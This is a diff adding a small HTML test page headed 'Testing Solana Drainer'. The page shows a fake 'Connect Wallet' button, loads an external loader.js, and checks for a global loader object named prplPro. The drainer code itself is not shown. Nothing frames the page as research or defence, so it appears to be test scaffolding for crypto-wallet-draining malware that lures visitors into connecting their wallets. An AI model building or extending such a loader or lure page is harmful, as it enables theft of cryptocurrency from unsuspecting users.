@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Loader</title>
+</head>
+<body>
+    <h1>Testing Solana Drainer</h1>
+    <button class="interact-button">Connect Wallet</button>
+    
+    <script src="loader.js"></script>
+    <script>
+        console.log('Loader script loaded');
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM loaded, checking for loader...');
+            if (typeof window.prplPro !== 'undefined') {
+                console.log('Loader found and ready');
+            } else {
+                console.error('Loader not found');
+            }
+        });
+    </script>
+</body>
+</html>
